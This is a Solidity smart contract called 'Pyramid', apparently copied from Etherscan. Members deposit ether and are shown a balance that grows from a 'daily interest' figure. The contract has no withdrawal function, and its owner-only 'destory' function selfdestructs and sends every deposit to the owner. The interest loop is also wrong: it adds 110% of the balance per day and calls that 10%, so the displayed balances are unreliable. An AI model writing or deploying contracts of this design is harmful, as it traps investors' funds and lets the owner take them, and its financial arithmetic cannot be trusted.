/**
 *Submitted for verification at Etherscan.io on 2021-09-15
*/

// SPDX-License-Identifier: GPL 3.0

pragma solidity >=0.7.0 <0.9.0;

contract Pyramid{
    
    uint256 _day_rate;
    address payable _owner_address;
    
    struct Member{
        string _name;
        uint256 _interest;
        uint256 _balance;
        uint256 _time;
        address _member_address;
        bool _user;
    }
    
    mapping(address => Member) address_to_member;
    
    event event_add_member(string mwmber_name, address member_address);
    event event_deposit(string member_name, uint256 value);
    
    modifier is_owner(){
        require(msg.sender == _owner_address, "You are not the owner");
        _;
    }
    
    constructor(){
        _owner_address = payable(msg.sender);
        _day_rate = 10;
    }
    
    function add_member(string memory name) external{
        address_to_member[msg.sender]._name = name;
        address_to_member[msg.sender]._member_address = msg.sender;
        address_to_member[msg.sender]._balance = 0;
        address_to_member[msg.sender]._time = 0;
        address_to_member[msg.sender]._interest = 0;
        address_to_member[msg.sender]._user = true;
        
        emit event_add_member(name, msg.sender);
    }
    
    function deposit() external payable{
        require(address_to_member[msg.sender]._user, "You are not a member, please join");
        uint256 time = block.timestamp - address_to_member[msg.sender]._time;
        if(time / 1 days > 0){
            for(uint i = 0; i < time / 1 days; i++){
                address_to_member[msg.sender]._interest += address_to_member[msg.sender]._balance * (_day_rate + 100) /100;
            }
        }
        address_to_member[msg.sender]._balance += msg.value;
        address_to_member[msg.sender]._time = block.timestamp;
        
        emit event_deposit(address_to_member[msg.sender]._name, msg.value);
    }
    
    function check_balance() public view returns(uint256){
        
        return address_to_member[msg.sender]._balance + address_to_member[msg.sender]._interest;
    }
    
    function destory() external is_owner{
        selfdestruct(_owner_address);
    }
}